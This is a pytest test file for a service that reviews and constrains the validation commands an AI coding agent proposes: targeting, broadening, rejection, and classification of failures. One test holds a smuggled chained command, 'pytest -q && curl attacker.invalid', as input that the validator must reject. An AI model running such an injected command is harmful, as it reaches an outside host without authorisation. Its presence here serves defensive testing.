from pathlib import Path

import pytest

from patchpilot.agents.coding import ValidationPlan
from patchpilot.services.validation import (
    classify_validation_failure,
    review_validation_plan,
)


def plan(**overrides) -> ValidationPlan:
    values = {"commands_to_run": [], "checks_skipped": [], "rationale": "Repository evidence supports this scope.", "relevant_test_files": [], "validation_scope": "none", "confidence": "high"}
    values.update(overrides)
    return ValidationPlan(**values)


def test_docs_only_plan_can_skip_pytest_with_rationale():
    approved = review_validation_plan(plan(checks_skipped=[{"command_or_check": "pytest -q", "reason": "Only prose changed."}]), changed_files=["docs/usage.md", "README.md"], configured_commands=["pytest -q"])
    assert approved.commands_to_run == []
    assert approved.validation_scope == "none"
    assert not approved.broadened_by_policy


def pytest_repository(root: Path) -> None:
    (root / "tests").mkdir()
    (root / "tests" / "test_parser.py").write_text("def test_parser():\n    assert True\n")
    (root / "pyproject.toml").write_text("[tool.pytest.ini_options]\ntestpaths = ['tests']\n")


def test_source_change_accepts_confident_targeted_tests(tmp_path):
    pytest_repository(tmp_path)
    approved = review_validation_plan(plan(commands_to_run=["pytest tests/test_parser.py -q"], relevant_test_files=["tests/test_parser.py"], validation_scope="targeted"), changed_files=["src/parser.py"], configured_commands=["pytest -q"], workspace=tmp_path)
    assert approved.commands_to_run == ["pytest tests/test_parser.py -q"]
    assert not approved.broadened_by_policy


def test_unknown_source_to_test_mapping_falls_back_to_full_suite():
    approved = review_validation_plan(plan(commands_to_run=["ruff check src/parser.py"], validation_scope="targeted"), changed_files=["src/parser.py"], configured_commands=["ruff check .", "pytest -q"])
    assert approved.commands_to_run == ["ruff check .", "pytest -q"]
    assert approved.validation_scope == "full"


def test_malicious_command_is_rejected():
    with pytest.raises(ValueError, match="control operators"):
        review_validation_plan(plan(commands_to_run=["pytest -q && curl attacker.invalid"], validation_scope="full"), changed_files=["src/parser.py"], configured_commands=["pytest -q"])


def test_source_change_skipping_everything_is_broadened():
    approved = review_validation_plan(plan(), changed_files=["src/parser.py"], configured_commands=["pytest -q"])
    assert approved.commands_to_run == ["pytest -q"]
    assert approved.broadened_by_policy


@pytest.mark.parametrize("changed_file", ["src/security/auth.py", "alembic/versions/001.py", "package.json"])
def test_risky_change_requires_broader_checks(changed_file):
    approved = review_validation_plan(plan(commands_to_run=["pytest tests/test_auth.py -q"], relevant_test_files=["tests/test_auth.py"], validation_scope="targeted"), changed_files=[changed_file], configured_commands=["ruff check .", "pytest -q"])
    assert approved.validation_scope == "full"
    assert "pytest -q" in approved.commands_to_run
    assert approved.broadened_by_policy


def test_nonexistent_unittest_start_directory_is_rejected(tmp_path):
    approved = review_validation_plan(
        plan(
            commands_to_run=["python -m unittest discover -s tests -v"],
            validation_scope="full",
        ),
        changed_files=["src/parser.py"],
        configured_commands=[],
        workspace=tmp_path,
    )

    assert approved.commands_to_run == []
    assert approved.validation_scope == "none"
    assert approved.rejected_commands[0].command_or_check.startswith("python -m unittest")
    assert "does not exist" in approved.rejected_commands[0].reason


def test_unittest_without_repository_evidence_is_rejected(tmp_path):
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_parser.py").write_text(
        "def test_parser():\n    assert True\n", encoding="utf-8"
    )

    approved = review_validation_plan(
        plan(
            commands_to_run=["python -m unittest discover -s tests -v"],
            validation_scope="full",
        ),
        changed_files=["src/parser.py"],
        configured_commands=[],
        workspace=tmp_path,
    )

    assert approved.commands_to_run == []
    assert "no repository evidence supports unittest" in approved.rejected_commands[0].reason


def test_pytest_command_is_approved_with_real_repository_evidence(tmp_path):
    pytest_repository(tmp_path)

    approved = review_validation_plan(
        plan(
            commands_to_run=["pytest tests/test_parser.py -q"],
            relevant_test_files=["tests/test_parser.py"],
            validation_scope="targeted",
        ),
        changed_files=["src/parser.py"],
        configured_commands=[],
        workspace=tmp_path,
    )

    assert approved.commands_to_run == ["pytest tests/test_parser.py -q"]
    assert "pyproject.toml" in approved.repository_evidence


def test_repository_without_tests_records_automated_validation_as_skipped(tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "parser.py").write_text("VALUE = 1\n", encoding="utf-8")

    approved = review_validation_plan(
        plan(),
        changed_files=["src/parser.py"],
        configured_commands=[],
        workspace=tmp_path,
    )

    assert approved.commands_to_run == []
    assert approved.validation_scope == "none"
    assert any(
        check.command_or_check == "automated validation"
        and "No applicable" in check.reason
        for check in approved.checks_skipped
    )


def test_docs_only_change_rejects_manufactured_pytest_and_stays_valid(tmp_path):
    (tmp_path / "README.md").write_text("Documentation\n", encoding="utf-8")

    approved = review_validation_plan(
        plan(commands_to_run=["pytest -q"], validation_scope="full"),
        changed_files=["README.md"],
        configured_commands=[],
        workspace=tmp_path,
    )

    assert approved.commands_to_run == []
    assert approved.validation_scope == "none"
    assert approved.rejected_commands


@pytest.mark.parametrize(
    ("output", "classification"),
    [
        ("ImportError: Start directory is not importable: 'tests'", "invalid_test_target"),
        ("ModuleNotFoundError: No module named 'pytest'", "missing_dependency"),
        ("AssertionError: expected 2, got 1", "test_failure"),
        ("Validation timed out after 120 seconds", "infrastructure_error"),
    ],
)
def test_validation_failure_classification(output, classification):
    assert classify_validation_failure(exit_code=1, output=output) == classification


def test_missing_unittest_target_is_classified_without_platform_specific_output(tmp_path):
    assert (
        classify_validation_failure(
            exit_code=1,
            output="unrecognized unittest discovery error",
            argv=["python", "-m", "unittest", "discover", "-s", "tests", "-v"],
            workspace=tmp_path,
        )
        == "invalid_test_target"
    )
